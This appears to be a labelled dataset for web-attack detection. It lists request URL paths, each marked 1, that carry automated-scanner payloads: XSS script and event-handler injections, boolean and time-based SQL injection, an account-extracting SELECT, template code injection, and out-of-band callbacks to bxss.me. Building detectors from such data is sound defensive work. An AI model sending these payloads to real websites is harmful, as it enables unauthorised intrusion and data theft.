sentences	labels
/'""()&%<acx><script >t5bf(9732)</script>/*/ \r\n\r\n 	 1
/****/bysw/swsj'||'/ \r\n\r\n 	 1
/****/category/pinpaijianshe?page=*/-->'""></iframe></script></style></title></textarea><script >alert(03825)</script> \r\n\r\n 	 1
/******/download/downfile.jsp?classid=0&filename=620cfd342eec49aab04f2e35c63427cf.docx') and 5309=5309 and ('mnwd'='mnwd \r\n\r\n 	 1
/************/0'xor(if(now()=sysdate(),sleep(3),0))xor'z/2017-01-13/138.html \r\n\r\n 	 1
/****/jwmsxf/wmjt/javascript:void(0); \r\n\r\n 	 1
/****/bxss.me/t/xss.html? \r\n\r\n 	 1
/******/system/2021/06/09'"/><iframe src=javascript:alert(2331) /013399706.shtml \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/"><script>alert(850)</script>?_=1630311617223 \r\n\r\n 	 1
/****/category/zijinqudao?page=1 and 4421=4421-- \r\n\r\n 	 1
/****/zdlygk/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/gys.htm \r\n\r\n 	 1
/******/system/2021/06/09'""/>/</script/>/<svg/onload=alert(2371) width=100//>/013399706.shtml \r\n\r\n 	 1
/****/zdlygk/ncwywfgz/ycs' and 2*3*8=6*8 and 'ycio'='ycio/hlx/xmb_gzdxb.htm \r\n\r\n 	 1
/******/system/2017/07/05/javascript:void(0); \r\n\r\n 	 1
/****/annonce/moteur-prix.php?categoriemoteur=1"">alert(777); \r\n\r\n 	 1
/************/categorysearch.do?cateid=1'""()&%<acx><script >zsez(9307)</script>&eq=1&oq=1&p=1&pg=15&pos=1&pq=1&q=请输入关键词&ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
socket.gethostbyname(""hitsi"" ""vqekvqfse01d8.bxss.me."")[3].to_s) ""/******/t20210806_185416.html \r\n\r\n 	 1
/*****/system/2021/11/09/javascript:window.close(); \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images/plugin/bxss.me/zwdt_v3.css \r\n\r\n 	 1
/****/system/2017/02/17/javascript:dozoom(14) \r\n\r\n 	 1
/********/mswpmm/common/signin.aspx?cbautosignin=""alert(777) \r\n\r\n 	 1
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419%' and 1783=3219  \r\n\r\n 	 1
/*****/main/myspace/student.php?keyword=31337"" onmouseover=confirm(777)//&active=0&_qf__search_user=&submit=search \r\n\r\n 	 1
/****/gjjj/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 1
/****/login.html?status='</script><script>alert(777)</script> \r\n\r\n 	 1
/**/system/2020/08/21/javascript:void(0); \r\n\r\n 	 1
/*****/20210811/javascript:void(0); \r\n\r\n 	 1
/**/system/2021/06/28/javascript:void(0); \r\n\r\n 	 1
/****/mtgz/2021_mtgz/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/t20210314_271326.html \r\n\r\n 	 1
/*******/dztxx5.php \r\n\r\n 	 1
/****/actionhandler/ajax_managed_services.php \r\n\r\n 	 1
/**/ui'||'/lib/easyui/themes/bootstrap/messager.css \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/""><script>alert(590)</script>?_=1630311526105 \r\n\r\n 	 1
/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/****/byysqgk/ybjsqzn'""()&%<acx><script >r8on(9899)</script>/list.html \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/"><script>alert(3658)</script>?_=1630311991836 \r\n\r\n 	 1
/**/system/2021/07/27/javascript:void(0); \r\n\r\n 	 1
/***/1.html/<img src="javascript:alert(369)"> \r\n\r\n 	 1
/if(now()=sysdate(),sleep(15),0)/****/2021_mtgz/202103/t20210314_271326.html \r\n\r\n 	 1
/****/system/2016/03/29/javascript:window.print() \r\n\r\n 	 1
/***/2021/10/http://bxss.me/t/fit.txt/art_34_242318.html \r\n\r\n 	 1
/****/index.php?action=list&order=nan"/><script>alert(777);</script>me&srt=yes \r\n\r\n 	 1
/*****/system/2015/08/11/011788556.shtml \r\n\r\n 	 1
/****/system/2020/06/30/javascript:window.close(); \r\n\r\n 	 1
/****/gccb/dlgc/javascript:stranbody(); \r\n\r\n 	 1
/'""()&%<acx><script >ke7r(9230)</script>/********/jcse/110105008056111/16/images/result.css \r\n\r\n 	 1
/****/web/search?channelid=234439&orderby=relevance') and 5335=5335 and ('1'='1&perpage=24&searchword=1 \r\n\r\n 	 1
socket.gethostbyname('hitqw' 'qynnbxhm93ba7.bxss.me.')[3].to_s) '/**/images/catesearchbtn.js \r\n\r\n 	 1
/****/减贫?page=1'""()&%<acx><script >ou5u(9833)</script> \r\n\r\n 	 1
/****/web/search?channelid=253477&keyword=the' and 2*3*8=6*8 and 'mign'='mign&orderby=-docreltime&outlinepage=10&page=2&perpage=15&searchword=the \r\n\r\n 	 1
/****/wp-content/plugins/dzs-videogallery/ajax.php?height=&source=6d27f""><script>alert(777)</script>894ba&type=&width= \r\n\r\n 	 1
/********/group-summary.jsp?search=test" onmouseover=alert(777) x=" \r\n\r\n 	 1
/*******/rle56xp.php \r\n\r\n 	 1
/****/qyzz/zjzj/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/****/abantecart/index.php?currency="><script>alert(777);</script>&product_id=109"><script>alert(777);</script>&rt=product/product \r\n\r\n 	 1
/**/news/spzx/201810/t20181012_194903.html' and 'x'='x \r\n\r\n 	 1
/***/?refresh=";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink();"// \r\n\r\n 	 1
/****/javascript:void(0); \r\n\r\n 	 1
/**/dj/info_37.aspx?itemid=1524' and 4819=4819 and 'wuej'='wuej \r\n\r\n 	 1
/************/template'""()&%<acx><script >efoq(9521)</script>/jcse/110105008056111/16/images/hanweb.css \r\n\r\n 	 1
/****/zfwjn/bxss.me/1105/list.html \r\n\r\n 	 1
/*****/gywm/qhxwkhd.shtml/"><script>alert(106)</script> \r\n\r\n 	 1
/****/"".gethostbyname(lc(""hitlq"".""apnbkpqu6333f.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(114).chr(86).chr(107).chr(78).""/tjj/zfxxgkml_2127/jytabljg_2061/list.html \r\n\r\n 	 1
/******/system/2021/02/22/javascript:void(); \r\n\r\n 	 1
/********/*/-->'""></iframe></script></style></title></textarea><script >alert(35167)</script> \r\n\r\n 	 1
socket.gethostbyname(""hitaj"" ""hnwgpuosb9993.bxss.me."")[3].to_s) ""/**/images/plugin/voice/hzrecorder.js \r\n\r\n 	 1
/****/bysw/202001/t20200119_/xfs.bxss.me.html \r\n\r\n 	 1
/****/czgk/bmyjs/zzqfyxt/szsszjrmfy/201903/encodeuricomponent(window.location.href) \r\n\r\n 	 1
/****/czgk/bmjs/http://bxss.me/t/fit.txt/ \r\n\r\n 	 1
/****/web/search?channelid=254846&searchword=天津') and 9086=(select 9086 from pg_sleep(5)) and ('kjbi'='kjbi \r\n\r\n 	 1
/**********/system/2021/12/15/javascript:void(); \r\n\r\n 	 1
/****/20210326/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/*******/5fso1t.php \r\n\r\n 	 1
/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/****/phpwiki/index.php?pagename=</script><script>alert(777)</script><!-- \r\n\r\n 	 1
/*****/dsp_dp_showmonth.cfm? 5=posn 1&datelong="">alert(777) \r\n\r\n 	 1
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419%' and 7628=7628 and '%'=' \r\n\r\n 	 1
/****/20210902/javascript:void(0); \r\n\r\n 	 1
/************/interfaces/dimension.do?cateid=1&eq=&oq=&p=1&pg=15&pos=&pq=&q=请输入关键词&ranksign=&searchid=1'""()&%<acx><script >dr2p(9199)</script>&total=&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/**/index%' and 2*3*8=6*8 and 'tito'!='tito%/connect_us.html \r\n\r\n 	 1
/****/zfwjn/1088/1095/list.html?new=0.12735219527013664<esi:include src=""http://bxss.me/rpb.png""/> \r\n\r\n 	 1
/**********/system/2021/12/19/javascript:void(0); \r\n\r\n 	 1
/****/system/2021/11/05/javascript:window.close(); \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033' and 3953=3818 and '1'='1&owner=1707212448 \r\n\r\n 	 1
/****/index.php?show_record_links=1&table=products"">alert(777);&add_new_item=1 \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(6765)">?_=1630312437488 \r\n\r\n 	 1
/**/system/2021/11/15/javascript:void(0); \r\n\r\n 	 1
/****/mswpmm/common/newaccount.aspx?email=alert(777) \r\n\r\n 	 1
/****/'""()&%<acx><script >hvqt(9638)</script>/ \r\n\r\n 	 1
/****/annonce/moteur-prix.php?categoriemoteur=1"">alert(777); \r\n\r\n 	 1
/jsearchfront"" and 2*3*8=6*8 and ""pmc2""=""pmc2/********/jcse/110105008056111/16/images/view.js \r\n\r\n 	 1
/investors-garden%' and 2*3*8=6*8 and 'ydyr'!='ydyr%/**********/graphic/2020-02-27/8981.html \r\n\r\n 	 1
/**********/system/2021/11/30/javascript:window.print() \r\n\r\n 	 1
/************/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=if(now()=sysdate(),sleep(15),0)&pq=1&q=请输入关键词&ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/****/20210924/javascript:void(0); \r\n\r\n 	 1
/**/admin/index.php?step=admin_member_display&search_field=all&keyword=<script>alert(777)</script>&cmd_button=search user \r\n\r\n 	 1
/****/rwfc/202009/t20200915_253522.html' and 'x'='x \r\n\r\n 	 1
/zwxx_11337/****/202108/encodeuricomponent(window.location.href) \r\n\r\n 	 1
/zwxx_11337/****/202007/encodeuricomponent(window.location.href) \r\n\r\n 	 1
/************/bxss.me/jcse/110105008056111/16/images/jquery.waterfall.js \r\n\r\n 	 1
/**/mswpmm/common/signin.aspx?cbautosignin=""alert(777) \r\n\r\n 	 1
/*****/system/2020/05/04/javascript:void(); \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(372)">?_=1630311380750 \r\n\r\n 	 1
/*****/system/2020/08/04/javascript:window.print() \r\n\r\n 	 1
/*****/system/2021/10/02/javascript:void(0); \r\n\r\n 	 1
/****/zdlygk%' and 2*3*8=6*8 and 'ma2k'!='ma2k%/ncwywfgz/wzs/qtxs/xmb_gzdxb.htm \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images/plugin/bxss.me/pinterest_grid.js \r\n\r\n 	 1
/****/web/search?searchword=1&channelid=287219&perpage=-1 or 9111=6314#&templet=1&token=1 \r\n\r\n 	 1
/****/web/search?channelid=299868&perpage=1000') and 1844=1844  \r\n\r\n 	 1
/*/210909-'""()&%<acx><script >9hvh(9102)</script>/index/d00139fee967b9a5c83cbe1cd7e911f8.css \r\n\r\n 	 1
/****/20210804/javascript:void(0); \r\n\r\n 	 1
/****/index.cfm?error.diagnostics="">alert(777) \r\n\r\n 	 1
/*****/system/2020/10/14/javascript:window.close(); \r\n\r\n 	 1
/******/rss/rssfeed.jsp?colid=34' and 5511=5511 and 'ezaf'='ezaf \r\n\r\n 	 1
/****/zdlygk/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/gys/jyx.htm \r\n\r\n 	 1
/******/download/downfile.jsp?classid=0' and 3223=3223 and 'lhuj'='lhuj&filename=f8c2ed3e25ea4c269bf2e627a90b568a.docx \r\n\r\n 	 1
/*****/system/2010/05/25/010129335.shtml \r\n\r\n 	 1
/********/login.html?status='</script><script>alert(777)</script> \r\n\r\n 	 1
/****/zdlygk/ncwywfgz/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/hlx/xmb_gzdxb.htm \r\n\r\n 	 1
/****/form.jspx?id=";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink();"&channelid=1542 \r\n\r\n 	 1
/****/1012/document.location.href \r\n\r\n 	 1
/****/index.php?title=acunetixtest4965a0&action=submit \r\n\r\n 	 1
/**/xfxg/javascript:void(0); \r\n\r\n 	 1
/**/mavideo/gvideos.php?gid=1 and 1=1 \r\n\r\n 	 1
/****/wdsjs/hfswsj/'.gethostbyname(lc('hithn'.'fjdxhssdbd351.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(105).chr(75).chr(102).chr(84).'/t20210906_186411.html \r\n\r\n 	 1
/**/ui/lib<esi:include src=""http://bxss.me/rpb.png""/>/security/sm2.js \r\n\r\n 	 1
/****/category/silumaoyi?page=1</script><script>4dq6(9831)</script> \r\n\r\n 	 1
/jsearchfront<esi:include src=""http://*******/rpb.png""/>/template/jcse/110105008056111/16/images/hanweb.css \r\n\r\n 	 1
/***/index.php?do=post&id=483&c=dt&a=goods& \r\n\r\n 	 1
/**/getvc?url[0]==2and 3 in &rnd=1949831455&session=1374175893299109000&isweb=1&uv=16346483593782190000&i_webid=1&lan=zh-cn&cookie=1&color=24-bit&url[1]=extractvalue(1,concat(char(126),md5(1281644804)))&i_columnid=1&resolution=1920x1080&i_articleid=0&type=1 \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images'||'/plugin/websitechange/zwdt_v3.css \r\n\r\n 	 1
/*******/bh5gm4.php \r\n\r\n 	 1
/*******/vvvgimho.php \r\n\r\n 	 1
/******/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) \r\n\r\n 	 1
/gg'||'/*****/index.html \r\n\r\n 	 1
/******/resource' and 2*3*8=6*8 and 'rkpm'='rkpm/js/image/imagescroll.js \r\n\r\n 	 1
/*******/grayscale.js \r\n\r\n 	 1
/**/ourbusiness/tradeandservices/ \r\n\r\n 	 1
/****/zdlygk/bzxajgc/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.htm \r\n\r\n 	 1
/****/web/search?perpage=20&outlinepage=10&keyword=1)); waitfor delay '0:0:2&channelid=240998&searchword=1&page=10 \r\n\r\n 	 1
/**/system/2021/04/22/javascript:void(0); \r\n\r\n 	 1
/****/wdsjs/hfswsj/202109/'.gethostbyname(lc('hitsl'.'rgcsmdld45d3d.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(100).chr(86).chr(121).chr(77).'_186411.html \r\n\r\n 	 1
/*****/mobiledoc/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror="alert(777)"/> \r\n\r\n 	 1
/***/interface/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270' and 2035=2035 and '1'='1 \r\n\r\n 	 1
/*******/6oqmchl.php \r\n\r\n 	 1
socket.gethostbyname(""hitwp"" ""cmjbbqhpe424a.bxss.me."")[3].to_s) ""/****/ \r\n\r\n 	 1
/**/index.php?title=acunetixtesta2a172&action=submit \r\n\r\n 	 1
/****/dependencies/index?search="">alert(/777/) \r\n\r\n 	 1
/*****/index.php?ac=search&at=taglist&tagkey=anony',tags) or did>1 and 101=ascii((seselectlect mid(table_name,1,1) frfromom information_schema.tables whwhereere table_schema =database() limit 1,1)) limit 1-- t t \r\n\r\n 	 1
/****/?type=extractvalue(1,concat(char(126),md5(1999346122))) \r\n\r\n 	 1
/****/interface/rest/threatfeeds/pagedjson?namepattern=&page=0&size=25&sortcol=address&sortdir="/><script>alert(777)</script> \r\n\r\n 	 1
/******/mswpmm/common/newaccount.aspx?ddlculture=alert(777) \r\n\r\n 	 1
/************/categorysearch.do?cateid=1&eq=1&oq=if(now()=sysdate(),sleep(15),0)&p=1&pg=15&pos=1&pq=1&q=请输入关键词&ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/***/index.php?do=post&id=418&c=dt&a=goods& \r\n\r\n 	 1
/**/ui/widgets/validity/validity' and 2*3*8=6*8 and '8stv'='8stv.js \r\n\r\n 	 1
/****/wp-admin/admin.php?where1=alert(777)&searchsubmit=buscar&page=nsp_search \r\n\r\n 	 1
/************/categorysearch.do?cateid=1&p=1&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111'""()&%<acx><script >hzph(9150)</script> \r\n\r\n 	 1
/****/zycwxx/202011/t20201113_255857.html' and 'x'='y \r\n\r\n 	 1
/****/web/search?page=2&channelid=253477 and 0012=5204--&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 1
/**/zfxxgkjs/index.html?channelid=295157&searchword=0""xor(if(now()=sysdate(),sleep(15),0))xor""z \r\n\r\n 	 1
/*****/genixcms-master/genixcms-master/gxadmin/index.php?page=posts&q=1'alert(777) \r\n\r\n 	 1
/****/czgk/bmjs//xfs.bxss.me/ \r\n\r\n 	 1
/****/xxgkzn/ \r\n\r\n 	 1
socket.gethostbyname(""hitgv"" ""atyepoqcfb626.bxss.me."")[3].to_s) ""/****/list.html \r\n\r\n 	 1
/**********/system/2012/11/05/010943027_03.shtml \r\n\r\n 	 1
/********/modal_sendmail.aspx?from=user&usernamecollection=anony' and ('anony' 'secsiteserverinj' @@version)>0 and '1'='1 \r\n\r\n 	 1
/**/sustainability/csrreports/201908/t20190828_222708.html' and 'x'='y \r\n\r\n 	 1
/****/category/silumaoyi?page=1 and 5282=8325-- \r\n\r\n 	 1
/****/login.html?status='</script><script>alert(777)</script> \r\n\r\n 	 1
/***/col34/bxss.me.html \r\n\r\n 	 1
/******/visitcount/visit.jsp?i_columnid[0]==2and 3 in &i_columnid[1]=convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1074475338')))&i_webid=1&type=1 \r\n\r\n 	 1
/**/zwfw/index.html \r\n\r\n 	 1
/****/lnysj/ and 1=1 \r\n\r\n 	 1
/******/0/http://bxss.me/t/fit.txt?.jpg.js \r\n\r\n 	 1
/******/resource/code/datainput.jsp?owner=' or 8062=8062 and '1'='1 \r\n\r\n 	 1
/cgi-bin/*********/admin/notificationpopup.php?new=1&type=cr&height=alert(777) \r\n\r\n 	 1
/****/哈电党建/*/-->'""></iframe></script></style></title></textarea><script >alert(46439)</script>?page=1 \r\n\r\n 	 1
/*******/asg.php \r\n\r\n 	 1
/****/category/zijinqudao \r\n\r\n 	 1
/*/main/admin/course_category.php?action=add&category=""/><script>confirm(777)</script> \r\n\r\n 	 1
/****/zzxxgk/tjj/tjjysqgk/gkcx/list.html?new="".gethostbyname(lc(""hitbn"".""qyiysvkz958f5.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(109).chr(78).chr(106).chr(80)."" \r\n\r\n 	 1
/****/2020jnxc/hdnr/ \r\n\r\n 	 1
/****/system/2021/04/22'"/><img src=javascript:alert(2402) /013373702.shtml \r\n\r\n 	 1
/*******/sccba/10690/20577/javascript:; \r\n\r\n 	 1
/****/blxw.htm \r\n\r\n 	 1
/about-southwest/******/2021-10-14/10953.html \r\n\r\n 	 1
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/wjdc.htm \r\n\r\n 	 1
/****/kycg/' and 'x'='y \r\n\r\n 	 1
/*******/jdh07jfs.php \r\n\r\n 	 1
/*****/system/2021/12/04/javascript:void(); \r\n\r\n 	 1
/***/mswpmm/common/newaccount.aspx?ddlculture=alert(777) \r\n\r\n 	 1
/*********/0'xor(if(now()=sysdate(),sleep(15),0))xor'z.aspx \r\n\r\n 	 1
/****/丝路 \r\n\r\n 	 1
/****/czgk'""()&%<acx><script >5vc5(9837)</script>/bmjs/gdyx/ \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/"><script>alert(550)</script>?_=1630311515828 \r\n\r\n 	 1
/'.gethostbyname(lc('hitrp'.'roxjmtjqc1f52.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(110).chr(81).chr(111).chr(73).'/*****/1088/1105/list.html \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/""><script>alert(470)</script>?_=1630311423453 \r\n\r\n 	 1
/****/javascript:void(0); \r\n\r\n 	 1
/****/jsly/gcdzyqzysjx/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/****/tpxw/1.htm \r\n\r\n 	 1
/****/advanced-search/?term=asdf&"><script>alert(777)</script> \r\n\r\n 	 1
/****/zdlygk/bzxajgc/gys/jyx'||'.htm \r\n\r\n 	 1
/***//<script>alert`90559`</script> \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(727)">?_=1630311565792 \r\n\r\n 	 1
/****/wlzj/202103/t20210303_'""()&%<acx><script >0gna(9822)</script>.html \r\n\r\n 	 1
/****/web/search?channelid=299868&perpage=1000' and 7423=7423  \r\n\r\n 	 1
/****/ljbwlaqds/hdzx/javascript:void(0); \r\n\r\n 	 1
/*/public/viewclick/getall.php?classid=0'xor(if(now()=sysdate(),sleep(9),0))xor'z \r\n\r\n 	 1
/***/mswpmm/common/newaccount.aspx?btncancel=alert(777) \r\n\r\n 	 1
/*********/instructions/data_back.php \r\n\r\n 	 1
/*******/q5zsq.php \r\n\r\n 	 1
/****/category/yanjiubaogao?page=1%' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)--  \r\n\r\n 	 1
/****/rdhy%' and 2*3*8=6*8 and '11xw'!='11xw%.htm \r\n\r\n 	 1
/**/ui/widgets/hanweb'||'/placeholder/css/placeholder.css \r\n\r\n 	 1
/****/qzfwj/5620/5642/\"javascript:void(0)\" \r\n\r\n 	 1
/****/wlzj/http://bxss.me/t/fit.txt?.jpg/t20210303_2614145.html \r\n\r\n 	 1
/**********/system/2021/11/02/javascript:void(); \r\n\r\n 	 1
/*******/gm6xjp.php \r\n\r\n 	 1
/*****/system/2015/06/14/javascript:void(); \r\n\r\n 	 1
/***/col53/index.html"" and ""x""=""y \r\n\r\n 	 1
/******/visitcount/visit.jsp?i_webid[0]==2"and/**/extractvalue(1,concat(char(126),md5(1624595784)))and"and 3 in &i_columnid=1&i_webid[1]=3&type=1 \r\n\r\n 	 1
/*****/user/gallery1.php?g_name=<script>alert(77729</script> \r\n\r\n 	 1
/**/h5kekjd2/xhr_send?t=1629433371354 \r\n\r\n 	 1
/************/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1<esi:include src=""http://bxss.me/rpb.png""/>&pq=1&q=请输入关键词&ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/****/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/25505.htm \r\n\r\n 	 1
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime') or 8524=8524  \r\n\r\n 	 1
/****/kycg/zdkjcg/ and 1=1 \r\n\r\n 	 1
/****/czgk/bmyjs/zzqfyxt/hnqrmfy/\"javascript:void(0)\" \r\n\r\n 	 1
/****/shzr/jzgj/ \r\n\r\n 	 1
/****/czgk/bmjs/zzqfyxt/xxqrmfy/\"javascript:void(0)\" \r\n\r\n 	 1
/**********/system/2021/09/07'"/><iframe src=javascript:alert(788) /013447361.shtml \r\n\r\n 	 1
/*******/template/jcse/110105008056111/16/images/plugin/category/js.js \r\n\r\n 	 1
/**********/system/2021/09/07'"/><img src=javascript:alert(813)>/013447361.shtml \r\n\r\n 	 1
/*******/tag_test_action.php?partcode={dede:field name='source' runphp='yes'}echo md52083191346&token=&url=a&{/dede:field}= \r\n\r\n 	 1
/************/fxglzgs/contact-us'||'/2017-01-24/193.html \r\n\r\n 	 1
/*******/5f2.php \r\n\r\n 	 1
/******/download/downfile.jsp?classid=0&filename=5b3c34d3371f43c19b0a669176cfe2ad.doc and 5314=6198 \r\n\r\n 	 1
/****/search.jspx?q=';window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()'// \r\n\r\n 	 1
/****/search.jspx?q="";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink();"" \r\n\r\n 	 1
/****/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/ncwywfgz/wzs/hsbq/xmb_gzdxb.htm \r\n\r\n 	 1
/****/category/quanqiuguanzhuredian?page=1' or 5615=5615 /* \r\n\r\n 	 1
/***/dashboard/index/41730?did=4&period=3"">alert(/777/) \r\n\r\n 	 1
/*******/4ph0.php \r\n\r\n 	 1
/****/zjdt/csjs/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/1.htm \r\n\r\n 	 1
/***/index.php?vyhl='>alert(777)&lang=cze \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448') and 0937=5410 and '1'='1 \r\n\r\n 	 1
/****/zycwxx/201912/t20191216_240557.html' and 'x'='y \r\n\r\n 	 1
/****/web/search?searchword=1&channelid=287219&perpage=24' and 7431=2165 and '1'='1&templet=1&token=1 \r\n\r\n 	 1
/cgi-bin/wp-admin/admin.php?page=thecartpress/*****/addressedit.php&address_id='"><script>alert(77729;</script> \r\n\r\n 	 1
/*/210514-1/index/'""()&%<acx><script >rsbr(9513)</script>aa5449bf388d846409a3d11e199a08.css \r\n\r\n 	 1
/****/zzxxgk/tjj%' and 2*3*8=6*8 and 'aw2d'!='aw2d%/ \r\n\r\n 	 1
